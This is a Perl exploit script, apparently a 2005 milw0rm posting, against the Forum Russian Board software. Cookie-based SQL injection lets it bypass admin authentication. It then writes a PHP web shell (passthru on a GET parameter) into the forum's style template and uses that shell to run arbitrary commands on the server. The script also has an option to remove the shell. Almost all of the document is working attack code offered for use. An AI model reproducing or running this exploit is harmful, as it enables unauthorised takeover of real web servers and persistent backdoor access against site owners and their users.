#!/usr/bin/perl

# Forum Russian Board 4.2 Full (FRB) (http://www.carline.ru , http://frb.ru)
# command execution exploit by RST/GHC (http://rst.void.ru , http://ghc.ru)
# bugs found by foster & 1dt.w0lf , xpl coded by 1dt.w0lf 
# RST/GHC - http://rst.void.ru , http://ghc.ru

use IO::Socket;
use Getopt::Std;

getopts("h:p:u:i:c:");

$host  = $opt_h;
$path  = $opt_p;
$user  = $opt_u;
$id    = $opt_i;
$cmd   = $opt_c || 'create';

$cmdspl = "%26%26"; # ;      - for unix
                    # %26%26 - for windows

if(!$host || !$path) { usage(); }
if(($cmd eq 'create' || $cmd eq 'delete') && (!$user || !$id)) { usage(); }

$host =~ s/(http:\/\/)//g;
$cook = $user."' /*";

if($cmd eq 'create' || $cmd eq 'delete'){
head();
print ">>> CREATE SHELL\n" if ($cmd eq 'create');
print ">>> DELETE SHELL\n" if ($cmd eq 'delete');
$sock = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$host", PeerPort => "80") || die "[-] CONNECT FAILED\n";
print $sock "GET ${path}admin/style_edit.php HTTP/1.1\n";
print $sock "Host: $host\n";
print $sock "Accept: */*\n";
print $sock "Cookie: board_user_cook=$cook;board_user_id=$id\n";
print $sock "Connection: close\n\n";
print "GETTING CURRENT STYLE ... [";
while ($res = <$sock>)
{
 if($res =~ /(.*)<\/textarea>/) { $data .= $1; $p = 0; }
 $data .= $res if $p;
 if($res =~ s/(.*)(<textarea)([^<>]*)([>])(.*)/$5/) { $data .= $res; $p = 1; }
}

if(length($data)>0) { print " DONE ]\n"; }
else { print " FAILED ]\n"; exit(); }

if($data =~ /rst_ghc/)
 {
 if($cmd eq 'create') { print "SHELL ALREADY EXIST!"; exit(); }
 if($cmd eq 'delete') 
  {  
  print "SHELL EXIST.\nDELETING SHELL.\n"; 
  $data =~ s/\s*<\? if\(\$_GET\[rst_ghc\]\)\{ passthru\(\$_GET\[rst_ghc\]\); \} \?>//g;
  }
 }
else
 {
 if($cmd eq 'create') 
  {
  $data .= "\n";
  $data .= '<? if($_GET[rst_ghc]){ passthru($_GET[rst_ghc]); } ?>';
  }
 if($cmd eq 'delete') { print "SHELL NOT EXIST. CAN'T DELETE."; exit(); }
 }

$data =~ s/(.)/"%".uc(sprintf("%2.2x",ord($1)))/eg;
$post = "message=${data}&form_h=yes&style_edit_ok=%C8%E7%EC%E5%ED%E8%F2%FC";
print "CREATE NEW STYLE ...[";
$sock = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$host", PeerPort => "80") || die "[-] CONNECT FAILED\r\n";
print $sock "POST ${path}admin/style_edit.php HTTP/1.1\n";
print $sock "Host: $host\n";
print $sock "Cookie: board_user_cook=$cook;board_user_id=$id\n";
print $sock "Content-Type: application/x-www-form-urlencoded\n";
print $sock "Content-length: ".length($post)."\n\n";
print $sock "$post";
print $sock "\n\n";
print " DONE ]\n"; 
if($cmd eq 'create') { print "SHELL CREATED SUCCESSFULLY! NOW YOU CAN TRY EXECUTE COMMAND."; }
if($cmd eq 'delete') { print "SHELL DELETED!"; }
}
else
{
head();
print ">>> COMMAND EXECUTE\n";
$sock = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$host", PeerPort => "80") || die "[-] CONNECT FAILED\n";
print $sock "GET ${path}index.php?rst_ghc=echo%20_START_%20$cmdspl%20$cmd%20$cmdspl%20echo%20_END_%20; HTTP/1.1\n";
print $sock "Host: $host\n";
print $sock "Accept: */*\n";
print $sock "Connection: close\n\n";

while ($res = <$sock>)
{
 if($res =~ /^_END_/) { $p = 0; }
 $data .= $res if $p;
 if($res =~ /^_START_/) { $p = 1; }
}
if(length($data)>0) { 
                      print "-----------------------------------------------------------------\n"; 
                      print $data; 
                      print "-----------------------------------------------------------------\n";
                      exit(0);
                    }
else { print "[-] FAILED\nMaybe you forget create shell first?\n"; exit(0); }

}

sub usage()
{
 head();
 print " USAGE : r57frb.pl [options]\n\n";
 print " Options: \n";
 print "          -h - host e.g. '127.0.0.1' , 'www.frb.ru'\n";
 print "          -p - path to forum e.g. '/frb/' , '/forum/'\n";
 print "          -u - admin username e.g. 'admin'\n";
 print "          -i - admin id e.g. '1'\n";
 print "          -c [create|delete|cmd]\n";
 print "              create - for create shell\n";
 print "              delete - for delete shell\n";
 print "              cmd - any command for execute\n";
 print "-----------------------------------------------------------------\n"; 
exit(0);
}

sub head()
{
 print "-----------------------------------------------------------------\n";
 print "Forum Russian Board 4.0 Full command execution exploit by RST/GHC\n";
 print "-----------------------------------------------------------------\n";
}

# milw0rm.com [2005-06-21]
